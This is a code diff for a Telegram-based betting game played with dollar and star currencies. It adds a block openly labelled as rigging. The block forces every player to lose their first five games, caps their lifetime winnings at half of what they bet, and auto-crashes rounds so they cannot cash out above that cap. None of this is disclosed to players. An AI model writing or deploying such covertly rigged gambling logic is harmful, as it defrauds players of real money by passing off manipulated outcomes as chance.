@@ -20,8 +20,32 @@ import {
   stopBgMusic,
 } from "@/hooks/useGameSounds";
 import { useBalanceContext } from "@/contexts/BalanceContext";
-import { reportGameResult } from "@/lib/telegram";
+import { reportGameResult, getTelegram } from "@/lib/telegram";
 import { toast } from "@/hooks/use-toast";
+
+// ============= RIGGING (house edge) =============
+// Tracks lifetime bets/wins per user+currency in localStorage.
+// Rules:
+//  - First 5 games: ALWAYS lose (force crash on lane 1).
+//  - After that: allow wins, but cap so lifetime win ratio stays <= 50%.
+//    i.e. maxAllowedWin (this round) = max(0, 0.5 * totalBet - totalWin)
+//  - If next lane's payout would exceed cap → force crash.
+//  - User cannot cash out above the cap (auto-crashes instead).
+type RigStats = { totalBet: number; totalWin: number; games: number };
+const rigKey = (currency: "dollar" | "star") => {
+  const uid = getTelegram()?.initDataUnsafe?.user?.id ?? "demo";
+  return `chickenroad_rig_${uid}_${currency}`;
+};
+const readRig = (currency: "dollar" | "star"): RigStats => {
+  try {
+    const raw = localStorage.getItem(rigKey(currency));
+    if (raw) return JSON.parse(raw);
+  } catch {}
+  return { totalBet: 0, totalWin: 0, games: 0 };
+};
+const writeRig = (currency: "dollar" | "star", s: RigStats) => {
+  try { localStorage.setItem(rigKey(currency), JSON.stringify(s)); } catch {}
+};
 
 type Difficulty = "easy" | "medium" | "hard" | "hardcore";
 type Phase = "betting" | "playing" | "lost" | "cashed";
